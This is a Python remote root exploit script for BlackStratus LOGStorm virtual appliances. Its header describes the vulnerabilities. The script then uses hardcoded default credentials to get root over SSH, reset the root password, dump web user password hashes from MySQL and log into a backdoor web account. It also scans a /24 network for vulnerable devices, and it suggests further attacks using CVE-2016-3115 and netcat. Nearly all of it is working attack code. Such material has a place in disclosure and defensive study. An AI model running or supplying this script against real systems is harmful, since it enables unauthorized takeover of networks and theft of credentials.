#!/usr/bin/python
# logstorm-root.py
#
# BlackStratus LOGStorm Remote Root Exploit
#
# Jeremy Brown [jbrown3264/gmail]
# Dec 2016
#
# -Synopsis-
#
# "Better Security and Compliance for Any Size Business"
#
# BlackStratus LOGStorm has multiple vulnerabilities that allow a remote unauthenticated user, among
# other things, to assume complete control over the virtual appliance with root privileges. This is
# possible due to multiple network servers listening for network connections by default, allowing
# authorization with undocumented credentials supported by appliance's OS, web interface and sql server.
#
# -Tested-
#
# v4.5.1.35
# v4.5.1.96
#
# -Usage-
#
# Dependencies: pip install paramiko MySQL-python
#
# There are (5) actions provided in this script: root, reset, sql, web and scan.
#
# [root]  utilizes bug #1 to ssh login to a given <host> as root and run the 'id' command
# [reset] utilizes bug #2 to ssh login to a given <host> as privileged htinit user and resets the root password
# [sql*]  utilizes bug #3 to sql login to a given <host> as privileged htr user and retrieve web portal credentials
# [web]   utilizes bug #4 to http login to a given <host> as hardcoded webserveruser (presumably) admin account
# [scan]  scans a given <host>/24 for potentially vulnerable appliances
#
# *sql only works remotely before license validation as afterwards sql server gets firewalled, becoming local only.
#
# Note: this exploit is not and cannot be weaponized simply because exploits are not weapons.
#
# -Fixes-
#
# BlackStratus did not coherently respond to product security inquiries, so there's no official fix. But
# customers may (now) root the appliance themselves to change the passwords, disable root login, firewall
# network services or remove additional user accounts to mitigate these vulnerabilities.. or choose another
# product altogether because this appliance, as of today, simply adds too much attack surface to the network.
#
# -Bonuses-
#
# 1) Another account's (htftp/htftp) shell is set to /bin/false, which affords at least a couple attacks
# 
# 1.1) The appliance is vulnerable to CVE-2016-3115, which we can use to read/write to arbitrary files
# 1.2) We can use the login to do port forwarding and hit local services, such as the Java instance running
# in debug mode and probably exploitable with jdwp-shellifer.py (also netcat with -e is installed by default!)
#
# 2) More sql accounts: htm/htm_pwd and tvs/tvs_pwd
#

import sys
import socket
import time
from paramiko import ssh_exception
import paramiko
import MySQLdb
import httplib
import urllib

SSH_BANNER = "_/_/_/_/"
SSH_PORT = 22
MYSQL_PORT = 3306
MYSQL_DB = "htr"
MYSQL_CMD = "select USER_ID,hex(MD5_PASSWORD) from users;"
WEB_URL = "/tvs/layout/j_security_check"

ROOT_CREDS =   ["root", "3!acK5tratu5"]
HTINIT_CREDS = ["htinit", "htinit"]
MYSQL_CREDS =  ["htr", "htr_pwd"]
WEB_CREDS =    ["webserviceuser", "donotChangeOnInstall"]


def main():
    if(len(sys.argv) < 2):
        print("Usage: %s <action> <host>" % sys.argv[0])
        print("Eg.    %s root 10.1.1.3\n" % sys.argv[0])
        print("Actions: root reset sql web scan")
        return
 
    action = str(sys.argv[1])
    host = str(sys.argv[2])

    if("scan" not in action):
        try:
            socket.inet_aton(host)
        except socket.error:
            print("[-] %s doesn't look like a valid ip address" % host)
            return

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    #
    # ssh login as root and execute 'id'
    #
    if(action == "root"):
        try:
            ssh.connect(host, SSH_PORT, ROOT_CREDS[0], ROOT_CREDS[1], timeout=SSH_TIMEOUT)
        except ssh_exception.AuthenticationException:
            print("\n[-] Action failed, could not login with root credentials\n")
            return

        print("[+] Success!")
        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("id")
        print(ssh_stdout.readline())

        return

    #
    # ssh login as htinit and reset root password to the default
    #
    elif(action == "reset"):
        print("[~] Resetting password on %s..." % host)

        try:
            ssh.connect(host, SSH_PORT, HTINIT_CREDS[0], HTINIT_CREDS[1], timeout=SSH_TIMEOUT)
        except ssh_exception.AuthenticationException:
            print("\n[-] Reset failed, could not login with htinit credentials\n")
            return

        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("")

        ssh_stdin.write("4" + "\n")
        time.sleep(2)
        ssh_stdin.write(ROOT_CREDS[1] + "\n")
        time.sleep(2)
        ssh_stdin.write("^C" + "\n")
        time.sleep(1)

        print("[+] Appliance root password should now be reset")

        return

    #
    # sql login as htr and select user/hash columns from the web users table
    #
    elif(action == "sql"):
        print("[~] Asking %s for it's web users and their password hashes..." % host)

        try:
            db = MySQLdb.connect(host=host, port=MYSQL_PORT, user=MYSQL_CREDS[0], passwd=MYSQL_CREDS[1], db=MYSQL_DB, connect_timeout=3)
        except MySQLdb.Error as error:
            print("\n[-] Failed to connect to %s:\n%s\n" % (host, error))
            return

        cursor = db.cursor()
        cursor.execute(MYSQL_CMD)

        data = cursor.fetchall()

        print("[+] Got creds!\n")

        for row in data:
            print("USER_ID: %s\nMD5_PASSWORD: %s\n" % (row[0], row[1]))

        db.close()

        return

    #
    # http login as webserviceuser and gain presumably admin privileges
    #
    elif(action == "web"):
        print("[~] Attempting to login as backdoor web user at %s..." % host)

        try:   
            client = httplib.HTTPSConnection(host)
        except:
            print("[-] Couldn't establish SSL connection to %s" % host)
            return

        params = urllib.urlencode({"j_username" : WEB_CREDS[0], "j_password" : WEB_CREDS[1]})
        headers = {"Host" : host, "Content-Type" : "application/x-www-form-urlencoded", "Content-Length" : "57"}

        client.request("POST", WEB_URL, params, headers)

        response = client.getresponse()

        if(response.status == 408):
            print("[+] Success!")
        else:
            print("[-] Service returned %d %s, which is actually not our criteria for success" % (response.status, response.reason))

        return

    #
    # check the ssh network banner to identify appliances within range of <host>/24
    #
    elif(action == "scan"):
        count = 0
        print("[~] Scanning %s for LOGStorm appliances..." % sys.argv[2])

        for x in range(1,255):
            banner = None

            #
            # 10.1.1.1/24 -> 10.1.1.[x]
            #
            host = str(sys.argv[2]).split('/')[0][:-1] + str(x)

            try:
                ssh.connect(host, SSH_PORT, "user-that-doesnt-exist", "pass-that-doesnt-work", timeout=2)
            except ssh_exception.NoValidConnectionsError:
                pass
            except socket.timeout:
                pass
            except ssh_exception.AuthenticationException as error:
                banner = ssh._transport.get_banner()
                if banner and SSH_BANNER in banner:
                    print("[!] %s\n" % host)
                    count+=1

        print("[+] Found %d appliance(s)"% count)

        return

 
if __name__ == "__main__":
    main()
